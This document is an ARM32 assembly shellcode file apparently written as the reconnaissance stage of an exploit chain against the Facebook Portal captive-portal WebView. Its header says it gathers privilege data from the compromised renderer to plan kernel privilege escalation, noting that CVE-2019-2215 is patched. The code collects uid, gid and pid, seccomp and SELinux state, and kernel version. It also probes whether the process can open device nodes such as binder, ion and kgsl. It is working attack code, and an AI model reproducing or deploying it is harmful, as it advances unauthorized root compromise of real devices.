/*
 * recon_v1.s — Process context reconnaissance shellcode
 * ARM32 EABI shellcode for Facebook Portal captive portal WebView
 *
 * PURPOSE: Determine what privileges, SELinux context, seccomp mode,
 *          and device access we have from the renderer process.
 *          This information determines the kernel escalation strategy.
 *
 * BACKGROUND:
 *   CVE-2019-2215 is FULLY PATCHED on this kernel (wake_up_pollfree +
 *   synchronize_rcu + tmpref). We need a new escalation path.
 *
 * Results at wasm_mem+0x1400 (R11 = base):
 *   +0x00: uid          +0x04: gid
 *   +0x08: pid          +0x0C: ppid
 *   +0x10: seccomp      +0x14: no_new_privs
 *   +0x18: open(selinux_attr)   +0x1C: selinux bytes read
 *   +0x20: open(status)         +0x24: status bytes read
 *   +0x28: open(/dev/ion)       +0x2C: open(/dev/kgsl-3d0)
 *   +0x30: open(/dev/ashmem)    +0x34: open(/dev/binder)
 *   +0x38: open(/proc/version)  +0x3C: version bytes read
 *   +0x40: open(/dev/alarm)     +0x44: open(/dev/hwbinder)
 *   +0x48: open(/dev/vndbinder) +0x4C: sched_setaffinity
 *   +0x50: open(selinux/enforce) +0x54: enforce value
 *
 * String buffers:
 *   +0x100..0x1FF: SELinux context (wasm+0x1500)
 *   +0x200..0x9FF: /proc/self/status (wasm+0x1600)
 *   +0xA00..0xBFF: /proc/version (wasm+0x1E00)
 *
 * Return code: 0x5500 = success
 */

   .syntax unified
   .arch armv7-a
   .text
   .align 2
   .globl _start
   .type _start, %function

.equ FRAME, 32

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    mov     r10, r4             /* R10 = wasm_mem base */
    add     r11, r10, #0x1400   /* R11 = results base */

    /* ═══ 1. getuid32 ═══ */
    mov     r7, #199
    svc     #0
    str     r0, [r11, #0x00]

    /* ═══ 2. getgid32 ═══ */
    mov     r7, #200
    svc     #0
    str     r0, [r11, #0x04]

    /* ═══ 3. getpid ═══ */
    mov     r7, #20
    svc     #0
    str     r0, [r11, #0x08]

    /* ═══ 4. getppid ═══ */
    mov     r7, #64
    svc     #0
    str     r0, [r11, #0x0C]

    /* ═══ 5. prctl(PR_GET_SECCOMP=21) ═══ */
    mov     r0, #21
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     r7, #172
    svc     #0
    str     r0, [r11, #0x10]

    /* ═══ 6. prctl(PR_GET_NO_NEW_PRIVS=39) ═══ */
    mov     r0, #39
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     r7, #172
    svc     #0
    str     r0, [r11, #0x14]

    /* ═══ 7. Read /proc/self/attr/current ═══ */
    mvn     r0, #99
    adr     r1, str_selinux
    mov     r2, #0              /* O_RDONLY */
    mov     r3, #0
    mov     r7, #322            /* __NR_openat */
    svc     #0
    str     r0, [r11, #0x18]
    cmp     r0, #0
    blt     selinux_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r10, #0x1500
    mov     r2, #255
    mov     r7, #3
    svc     #0
    str     r0, [r11, #0x1C]
    cmp     r0, #0
    ble     se_close
    add     r2, r10, #0x1500
    mov     r3, #0
    strb    r3, [r2, r0]
se_close:
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       selinux_after
selinux_done:
    mov     r3, #0
    str     r3, [r11, #0x1C]
selinux_after:

    /* ═══ 8. Read /proc/self/status ═══ */
    mvn     r0, #99
    adr     r1, str_status
    mov     r2, #0
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x20]
    cmp     r0, #0
    blt     status_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r10, #0x1600
    ldr     r2, const_2047
    mov     r7, #3
    svc     #0
    str     r0, [r11, #0x24]
    cmp     r0, #0
    ble     st_close
    add     r2, r10, #0x1600
    mov     r3, #0
    strb    r3, [r2, r0]
st_close:
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       status_after
status_done:
    mov     r3, #0
    str     r3, [r11, #0x24]
status_after:

    /* ═══ 9. Device access tests ═══ */

    /* /dev/ion */
    mvn     r0, #99
    adr     r1, str_ion
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x28]
    cmp     r0, #0
    blt     ion_skip
    mov     r7, #6
    svc     #0
ion_skip:

    /* /dev/kgsl-3d0 */
    mvn     r0, #99
    adr     r1, str_kgsl
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x2C]
    cmp     r0, #0
    blt     kgsl_skip
    mov     r7, #6
    svc     #0
kgsl_skip:

    /* /dev/ashmem */
    mvn     r0, #99
    adr     r1, str_ashmem
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x30]
    cmp     r0, #0
    blt     ashmem_skip
    mov     r7, #6
    svc     #0
ashmem_skip:

    /* /dev/binder */
    mvn     r0, #99
    adr     r1, str_binder
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x34]
    cmp     r0, #0
    blt     binder_skip
    mov     r7, #6
    svc     #0
binder_skip:

    /* ═══ 10. Read /proc/version ═══ */
    mvn     r0, #99
    adr     r1, str_version
    mov     r2, #0
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x38]
    cmp     r0, #0
    blt     ver_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r10, #0x1E00
    mov     r2, #255
    mov     r7, #3
    svc     #0
    str     r0, [r11, #0x3C]
    cmp     r0, #0
    ble     ver_close
    add     r2, r10, #0x1E00
    mov     r3, #0
    strb    r3, [r2, r0]
ver_close:
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       ver_after
ver_done:
    mov     r3, #0
    str     r3, [r11, #0x3C]
ver_after:

    /* /dev/alarm */
    mvn     r0, #99
    adr     r1, str_alarm
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x40]
    cmp     r0, #0
    blt     alarm_skip
    mov     r7, #6
    svc     #0
alarm_skip:

    /* /dev/hwbinder */
    mvn     r0, #99
    adr     r1, str_hwbinder
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x44]
    cmp     r0, #0
    blt     hwbinder_skip
    mov     r7, #6
    svc     #0
hwbinder_skip:

    /* /dev/vndbinder */
    mvn     r0, #99
    adr     r1, str_vndbinder
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x48]
    cmp     r0, #0
    blt     vndbinder_skip
    mov     r7, #6
    svc     #0
vndbinder_skip:

    /* ═══ 11. sched_setaffinity (CPU 1 only) ═══ */
    mov     r3, #0x02
    str     r3, [sp, #0]
    mov     r0, #0
    mov     r1, #4
    add     r2, sp, #0
    mov     r7, #241
    svc     #0
    str     r0, [r11, #0x4C]

    /* ═══ 12. /sys/fs/selinux/enforce ═══ */
    mvn     r0, #99
    adr     r1, str_enforce
    mov     r2, #0
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x50]
    cmp     r0, #0
    blt     enforce_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r11, #0x54      /* read into +0x54 (4 bytes) */
    mov     r2, #4
    mov     r7, #3
    svc     #0
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       enforce_after
enforce_done:
    mov     r3, #0xFF
    str     r3, [r11, #0x54]
enforce_after:

    /* ═══ DONE ═══ */
    mov     r0, #0x5500
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ═══ Data pool ═══ */
    .align 2
const_2047:
    .word   2047

    /* ═══ String constants ═══ */
    .align 2
str_selinux:
    .asciz  "/proc/self/attr/current"
    .align 2
str_status:
    .asciz  "/proc/self/status"
    .align 2
str_ion:
    .asciz  "/dev/ion"
    .align 2
str_kgsl:
    .asciz  "/dev/kgsl-3d0"
    .align 2
str_ashmem:
    .asciz  "/dev/ashmem"
    .align 2
str_binder:
    .asciz  "/dev/binder"
    .align 2
str_version:
    .asciz  "/proc/version"
    .align 2
str_alarm:
    .asciz  "/dev/alarm"
    .align 2
str_hwbinder:
    .asciz  "/dev/hwbinder"
    .align 2
str_vndbinder:
    .asciz  "/dev/vndbinder"
    .align 2
str_enforce:
    .asciz  "/sys/fs/selinux/enforce"
    .align 2
